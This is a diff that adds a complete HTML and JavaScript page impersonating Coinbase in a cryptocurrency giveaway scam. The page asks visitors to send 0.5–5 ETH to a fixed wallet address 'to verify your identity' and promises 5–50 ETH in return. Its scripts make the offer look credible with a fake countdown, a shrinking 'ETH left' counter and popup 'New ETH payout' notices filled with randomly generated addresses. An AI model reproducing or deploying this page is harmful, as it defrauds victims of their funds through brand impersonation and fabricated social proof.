@@ -1,0 +1,431 @@
+<html lang="en"><head>
+<meta charset="utf-8">
+<title>Coinbase ETH</title>
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<link rel="stylesheet" href="css/bootstrap.css">
+<link rel="stylesheet" href="css/animate.css">
+<script type="text/javascript" src="js/clipboard.js"></script>
+<script type="text/javascript" src="js/jquery.min.js"></script>
+<script type="text/javascript" src="js/bootstrap-notify.min.js"></script>
+<style media="screen">
+        * {
+            text-rendering: optimizeLegibility;
+            -webkit-antialiasing: antialiased;
+        }
+        html {
+            font-family: -apple-system, 'SF Pro Display', 'SF Pro Text', 'Helvetica Neue', 'Helvetica', Arial, sans-serif;
+            font-size: 16px;
+            background: linear-gradient(-170deg, #ffffff 0%, #331756 99%) no-repeat center fixed;
+            background: linear-gradient(-170deg, #1d78e9, #66aaff 99%) no-repeat center fixed;
+            padding: 0;
+            margin: 0;
+        }
+        body {
+            font-size: 16px;
+            background: url(img/coinbase.jpg) no-repeat center fixed;
+            background-size: cover;
+            padding: 0;
+            margin: 0;
+        }
+        #Logo-Grande {
+            height: 125px;
+            margin: 0 auto 20px;
+        }
+        h1 {
+            font-size: 40px;
+            font-weight: 300;
+            line-height: 50px;
+            margin: 0 0 40px;
+        }
+        h2 {
+            font-size: 30px;
+            font-weight: 300;
+            line-height: 40px;
+            margin: 0 0 20px;
+        }
+        h3 {
+            font-size: 24px;
+            line-height: 30px;
+        }
+        @media screen and (max-width: 375px) {
+            #Logo-Grande {
+                height: 100px;
+                margin: 0 auto 0px;
+            }
+            h1 {
+                font-size: 28px;
+                line-height: 34px;
+                margin: 0 0 8px;
+            }
+            h2 {
+                font-size: 24px;
+                line-height: 30px;
+                margin: 0 0 5px;
+            }
+            h3 {
+                font-size: 20px;
+                line-height: 30px;
+            }
+            p {
+                font-size: 16px;
+            }
+        }
+        #js-HeaderGroup {
+            color: #FFF;
+        }
+        .etu-form {
+            color: #000;
+            border-radius: 4px;
+            box-shadow: rgba(67, 36, 227, 0.4) 0 0 0 8px;
+            /* height: 300px; */
+            padding: 30px 50px;
+        }
+        body[data-form-submitted='false'] .etu-form .etu-form-inner-step1 { display: block; }
+        body[data-form-submitted='false'] .etu-form .etu-form-inner-step2 { display: none; }
+        body[data-form-submitted='false'] .hide-before-form-submission { display: none; }
+        body[data-form-submitted='true'] .etu-form { display: none; }
+        body[data-form-submitted='true'] .hide-after-form-submission { display: none; }
+        body[data-form-submitted='true'] .etu-form .etu-form-inner-step1 { display: none; }
+        body[data-form-submitted='true'] .etu-form .etu-form-inner-step2 {
+            color: #000;
+            display: block;
+        }
+        body[data-form-submitted='true'] .etu-form .etu-form-inner-step2 p {
+            margin: 0 0 0px;
+        }
+        body[data-form-submitted='true'] .etu-form .etu-form-inner-step2 code {
+            color: red;
+        }
+        .etu-form h3 {
+            /* font-size: 24px; */
+            font-weight: 300;
+            line-height: 30px;
+            text-align: center;
+            padding: 15px 0 30px;
+            margin: 0;
+        }
+        .etu-form input[type="text"] {
+            font-size: 16px;
+            line-height: 26px;
+            border: 1px solid #BBB;
+            border-radius: 200px;
+            box-shadow: none;
+            outline: none;
+            display: block;
+            width: 100%;
+            height: 50px;
+            padding: 12px 16px;
+            margin-bottom: 30px;
+        }
+        .etu-form input[type="text"]:focus {
+            border-color: #333;
+        }
+        .btn {
+            font-size: 16px !important;
+            font-weight: 600 !important;
+            line-height: 26px !important;
+            padding-top: 12px !important;
+            height: 50px !important;
+        }
+        label {
+            font-weight: 600;
+        }
+        @media screen and (orientation: landscape) {
+            body {
+                /* background-size: fill; */
+            }
+            #js-HeaderGroup {
+                padding-top: 12vh;
+            }
+        }
+        @media screen and (orientation: portrait) {
+            body {
+                /* background-size: fill; */
+            }
+            #js-HeaderGroup {
+                padding-top: 10px;
+            }
+            .etu-form-container, .etu-form {
+                padding: 0 16px;
+            }
+            .etu-form p {
+                line-height: 1.6em;
+                text-align: left;
+                margin: 0 0 15px !important;
+            }
+        }
+        body[data-form-submitted='false'] #js-MyStatistics { display: none; }
+        body[data-form-submitted='true'] #js-MyStatistics { display: block; }
+        #js-MyStatistics input[type="text"] {
+            background: rgba(255, 255, 255, 0.8);
+            border: none;
+            outline: none !important;
+        }
+        #js-MyStatistics .input-group {
+            margin: 10px 0 !important;
+        }
+        aside {
+            opacity: 0.5;
+        }
+        .my-statistics-panel-cell-container {
+            width: 50%;
+        }
+        .my-statistics-panel-cell {
+            text-align: center;
+            background: rgba(255, 255, 255, 0.05);
+            border-radius: 4px;
+            height: 130px;
+            padding: 25px 0 0;
+        }
+        .my-statistics-panel-cell--number {
+            font-size: 32px;
+            line-height: 50px;
+        }
+        #js-FAQ h2, #js-FAQ h3 {
+            font-weight: 400;
+            /* padding: 0; */
+            /* margin: 10px 0; */
+        }
+        #js-FAQ h3 {
+            background: rgba(0, 0, 0, 0) right scroll no-repeat;
+            background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAACgAAAAoCAYAAAH7+Yj7AAAABGdBTUEAALGPC/xhBQAAAXBJREFUWAntmM0RgjAQhTlZgNZgG1oJpVAKXegRO/DgyR6owJP4PQdj+IkGBcfR3Zk37CYvu+GBJDFJXraqqhZuMEEJUtfwhkOeyh9OuHMxQeaCDzvUnoOjX5a4MVm/7498VMhDt9uRiIazTyZePUqQ0HkCJrSv2o/5PN5CzxhbxtwavHg+5EyZscYnilifLb1cs5iivRwG6/U99HZaoylgCnyNAvxOd+AM7puXyNkxJgfdVYi2pTqwIiYXvDg+xGtFrqtQYvqOQHc0D3Ea7RBnQN+80u8gToHstR0WA10C/E4Bv9ggn2QHEJRgUDIjmwKmgClgCpgCgxRgBdqCPVgPGjgCWTXr2ptgOgha2DNwPS1zHe0/mb6i5Nd6rxoy1VTt+IMU5PcStGal4vUkxheAxDrlaa8l034rB0/3XOLUXI2RKce0mxkKaIdZgJvJdwdr+SDY3xJ22pCJLIDUvCmEG6/wtLOz7KaAKWAKPFXgAqQGunnoOTNJAAAAAElFTkSuQmCC');
+            background-size: 20px;
+            cursor: pointer;
+            padding-right: 20px;
+            margin-bottom: 20px;
+        }
+        #js-FAQ h3[data-content-hidden="false"] {
+            background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAACgAAAAoCAYAAAH7+Yj7AAAABGdBTUEAALGPC/xhBQAAAc9JREFUWAntmEFugzAQRaGqoq7TM/Qa9CTkJhylOUW3yQ266CrbrHOCrNK+X+EKKbE9hkFigaURCH//+R4PY0NVFbcfWhj0FG4mXqG8TKBgeJsdDujLAtpkQUUA3HbmAYA/zeAs8JHr2IqdLWz/6x4F43Ib7Rx2AMyzhQElrKcwKHuF1ZZ0AJ2TIqstA0CRPXopLnga7JrChL7ncBO7QnSg71zX9UsMY34O2Q17Mw/IASH76BXmoPZ+KcRu9hFGJKQ+Kzz0B+cVa4bP1vuyCFgWJlZk7zxBpjdmf9cx5gFkW4s6Mzdkfq8gZB1mL885maVTTS4KZNoLdjmnpn7IzEXVSvgNqf0cYWEtjZ84kzGkf9fH0eLfhoHQt2RBuBkz9aRcCGfZWyTUdp5Kyus7IfPfrCA9WpyvGJcIEG6l7xFz/FJwkVZViFKC6YXVxrGscwaCWkztgvm9Vh7BQ5AKiJoOBMtpCFK+naSM5rsFTZ0mgtZ8GxVEIrfMfNNsEKfjjtqy8i2EGmHvmGqcap3fN2pw4HFF2CumWqfWenDOwoG4w59EcnIWBx6kCOx6kaqFC/sf1M8QYQ22+LzUZ+qalx5pqVoZ8jL/d9vF40ryOAK/d+CoaZdyv5cAAAAASUVORK5CYII=');
+        }
+        #js-FAQ section {
+            padding: 20px 0 0;
+        }
+        #js-FAQ section .faq-content {
+            display: none;
+        }
+        #js-FAQ section h3[data-content-hidden="false"] ~ .faq-content {
+            display: block;
+        }
+        #js-I18nButtons > span[data-i18n-setlang] {
+            cursor: pointer;
+        }
+        /* --------- Utility Classes --------- */
+        .separation-line {
+            background: rgba(255, 255, 255, 0.15);
+            width: 70%;
+            max-width: 400px;
+            height: 1px;
+            margin: 60px auto !important;
+        }
+        .display-block {
+            display: block;
+        }
+        @media screen and (max-width: 375px) {
+            .desktop-only {
+                display: none;
+            }
+        }
+        body[data-useragent-is-in-english="true"] .hide-english {
+            display: none;
+        }
+        /* --------- General --------- */
+        p, aside, blockquote {
+            font-size: 16px;
+            line-height: 1.5;
+        }
+        a {
+            /* color: inherit; */
+            text-decoration: none !important;
+            border-bottom: 1px solid rgba(255, 255, 255, 0.6);
+            padding-bottom: 3px;
+        }
+        a:hover {
+            border-bottom: 1px solid rgba(255, 255, 255, 1);
+        }
+        </style>
+<script type="text/javascript">
+        </script>
+</head>
+<body data-form-submitted="true" data-i18n-lang-fallback-list="en" data-i18n-page-default-lang="en" data-i18n-disabled="true" data-useragent-is-in-english="true">
+<div class="">
+<div class="section" id="js-HeaderGroup">
+<div class="text-center">
+<svg xmlns="http://www.w3.org/2000/svg" width="200" height="100" viewBox="0 0 122 28" class="Header__Logo" role="button" style="
+          width: 200px;
+          height: 50px;
+          margin-top: 2px;
+		  margin-bot: 20px;
+          fill: #FFFFFF;
+          cursor: pointer;
+        "><path fill-rule="evenodd" d="M10.34 23.89c.93 0 1.8-.17 2.62-.5 0 .03 1.67 2.62 1.7 2.63a9.88 9.88 0 0 1-4.81 1.17C4.72 27.2 1 23.81 1 18.42c0-5.43 3.9-8.8 8.85-8.8 1.75 0 3.14.38 4.53 1.12l-1.6 2.7c-.84-.33-1.7-.48-2.6-.48-3.03 0-5.38 1.93-5.38 5.46 0 3.34 2.27 5.47 5.54 5.47zM23.27 9.62c5.04 0 8.69 3.57 8.69 8.8 0 5.2-3.65 8.77-8.7 8.77-5 0-8.65-3.57-8.65-8.77 0-5.23 3.65-8.8 8.66-8.8zm0 3.22c-2.81 0-4.86 2.17-4.86 5.58 0 3.38 2.05 5.55 4.86 5.55 2.88 0 4.9-2.17 4.9-5.55 0-3.41-2.02-5.58-4.9-5.58zm11.08 13.97V10h3.76V26.8h-3.76zm-.5-21.98a2.36 2.36 0 0 1 4.71 0 2.4 2.4 0 0 1-2.35 2.4 2.4 2.4 0 0 1-2.35-2.4zm7.54 6.23a22.54 22.54 0 0 1 7.7-1.44c4.3 0 7.02 1.63 7.02 6.37v10.82H52.4V16.34c0-2.43-1.51-3.3-3.6-3.3-1.33 0-2.66.18-3.65.49V26.8H41.4V11.06zM59.26 1h3.76v9.45c.8-.42 2.35-.83 3.83-.83 4.86 0 8.5 3.1 8.5 8.5 0 5.43-3.6 9.07-9.82 9.07-2.43 0-4.56-.5-6.27-1.1V1zm3.76 22.62c.72.23 1.67.35 2.62.35 3.45 0 5.92-1.9 5.92-5.77 0-3.27-2.32-5.2-5.16-5.2-1.48 0-2.62.38-3.38.8v9.82zm23.2-8.08c0-1.82-1.38-2.66-3.24-2.66-1.93 0-3.45.57-4.85 1.37v-3.27a11.21 11.21 0 0 1 5.46-1.36c3.68 0 6.3 1.52 6.3 5.73v11.12c-1.6.42-3.87.68-5.77.68-4.36 0-7.55-1.32-7.55-5.12 0-3.42 2.92-5.09 7.78-5.09h1.86v-1.4zm0 3.9h-1.6c-2.62 0-4.33.77-4.33 2.48 0 1.74 1.6 2.42 3.87 2.42.57 0 1.37-.07 2.05-.18v-4.71zm6.4 2.82a8.82 8.82 0 0 0 5.13 1.9c1.67 0 2.77-.57 2.77-1.9 0-1.37-.99-1.86-3.15-2.43-3.5-.8-4.97-2.2-4.97-5.13 0-3.41 2.58-5.08 6-5.08 1.9 0 3.41.41 4.82 1.29v3.45a7.79 7.79 0 0 0-4.71-1.7c-1.63 0-2.5.8-2.5 1.9 0 1.1.71 1.66 2.65 2.2 3.84.83 5.5 2.27 5.5 5.3 0 3.54-2.69 5.13-6.33 5.13a9.87 9.87 0 0 1-5.2-1.36v-3.57zm16.69-3v.07c.23 3 2.8 4.64 5.43 4.64 2.31 0 3.98-.54 5.65-1.64v3.3c-1.52 1.07-3.76 1.56-5.92 1.56-5.24 0-8.8-3.34-8.8-8.65 0-5.35 3.49-8.92 8.12-8.92 4.9 0 7.21 3.15 7.21 7.74v1.9h-11.7zm8.16-2.43c-.08-2.62-1.37-4.06-3.8-4.06-2.16 0-3.75 1.52-4.25 4.06h8.05z"></path></svg>
+<br><br>
+</div>
+<div class="etu-form-container" style="width: 100vw; max-width: 660px; margin: 0 auto;">
+
+<div class="" id="js-MyStatistics">
+<div class="">
+<div class="">
+<div class="">
+<h2 class="text-center" style="font-size: 16px; line-height: 1.5; font-weight: bold; padding: 0 0 10px;"><span style="display: inline-block;">It has been an exciting past year. Thanks for your support, we're giving away <strong>5,000 ETH.</strong> <br/>In order to <strong>verify your identity</strong>, send <strong>0.5–5 ETH</strong> to the address below and <strong>5-50 ETH</strong> will be sent back to your address.
+</span></h2>
+</div>
+</div>
+<div class="">
+<div class="">
+<label>Payment Address:</label>
+</div>
+<div class="input-group mb-3">
+<input type="text" class="form-control js-ClickToSelect" readonly="" name="" value="0x3E40eeEbEC63BB5579154893d3300E82d23Ef9dE" id="js-Input-ReferCode">
+<div class="input-group-append">
+<span class="btn btn-light" id="js-ClipboardCopyButton-code" data-clipboard-target="#js-Input-ReferCode">Copy</span>
+</div>
+</div>
+</div>
+<div class="" style="height: 20px;">
+</div>
+
+<div class="" style="height: 20px;">
+</div>
+<div class="">
+<div class="">
+
+</div>
+<div class="my-statistics-panel-cell-container" style="float: right; padding-left: 10px;">
+<div class="my-statistics-panel-cell">
+<div class="my-statistics-panel-cell--number" id="eth-left"></div>
+<div class="my-statistics-panel-cell--label text-center">
+ETH left
+</div>
+</div>
+</div>
+<div class="my-statistics-panel-cell-container" style="float: left; padding-right: 10px;">
+<div class="my-statistics-panel-cell">
+<div class="my-statistics-panel-cell--number" id="time-left"></div>
+<div class="my-statistics-panel-cell--label text-center">
+Time left
+</div>
+</div>
+</div>
+<div class="clearfix">
+</div>
+</div>
+</div>
+</div>
+</div>
+ </div>
+</div>
+<script type="text/javascript">
+var Clipboards = {
+    code: new Clipboard('#js-ClipboardCopyButton-code'),
+    link: new Clipboard('#js-ClipboardCopyButton-link')
+};
+
+// promo initial values
+var ethTotal = 4500;
+var promoMinutesLength = 300;
+var initialTimestamp = 1520941431;
+//
+
+var finalTimestamp = new Date((initialTimestamp * 1000) + (promoMinutesLength * 60 * 1000)).getTime() / 1000;
+var count = (finalTimestamp -  now()); 
+
+var delay = 100;
+var initTick = 0;
+var secs = 0;
+
+function now() {
+    return Math.floor($.now() / 1000);
+}
+
+
+function secondsTimeToHMS(s) {
+    var h = Math.floor(s/3600);
+    s -= h*3600;
+    var m = Math.floor(s/60);
+    s -= m*60;
+    return h+":"+(m < 10 ? '0'+m : m)+":"+(s < 10 ? '0'+s : s);
+}
+
+function tick() {
+   var remaining = (count - (now() - initTick)); 
+
+   remaining = remaining >= 0 ? remaining : 0;
+   secs = remaining.toFixed(2);
+   if (secs == 0) {
+        $("#time-left").html("The promo is over!");
+   } else {
+       $("#time-left").html(secondsTimeToHMS(secs));
+       if (remaining) setTimeout(tick, delay);
+   }
+}
+
+function getCurrentEthBalance(secs) {
+    ethLeft = ((ethTotal * (secs)) / (promoMinutesLength * 60));
+    if ( ethLeft <= 0 ) { 
+        $("#eth-left").html(0);
+    } else {
+        $("#eth-left").hide().html(ethLeft.toFixed(2)).fadeIn('fast');
+        notifyMsg();
+    };
+}
+
+function notifyMsg() {
+    $.notify({
+    // options
+    icon: 'glyphicon glyphicon-warning-sign',
+    title: "<strong>New ETH payout:</strong>",
+    message: generateAddress(),
+    },{
+        // settings
+        type: 'info',
+        allow_dismiss: true,
+        newest_on_top: true,
+        placement: {
+            from: "top",
+            align: "right"
+        },
+        spacing: 10,
+        z_index: 1031,
+        mouse_over: null,
+        delay: 1000,
+        timer: 1000,
+        animate: {
+            enter: 'animated fadeInDown',
+            exit: 'animated fadeOutUp'
+        },
+    });
+}
+    
+initTick = now();
+setTimeout(tick, delay);
+
+(function loopEthBalance() {
+    var rand = Math.round(Math.random() * (4000 - 500)) + 500;
+    setTimeout(function() {
+        getCurrentEthBalance(secs);
+        loopEthBalance();  
+    }, rand);
+}());
+
+function dec2hex(dec) {
+  return ('0' + dec.toString(16)).substr(-2);
+}
+
+function generateAddress (len) {
+  var arr = new Uint8Array(37 / 2)
+  window.crypto.getRandomValues(arr)
+  return "0x" + Array.from(arr, dec2hex).join('') + "..."
+}
+
+document.querySelectorAll('.js-ClickToSelect').forEach(function (ele) {
+    ele.addEventListener('click', function (e) {
+        e.target.setSelectionRange(0, 9999);
+    });
+});
+
+$( document ).ready(function() {
+    getCurrentEthBalance(count);
+});
+</script>
+
+</body></html>
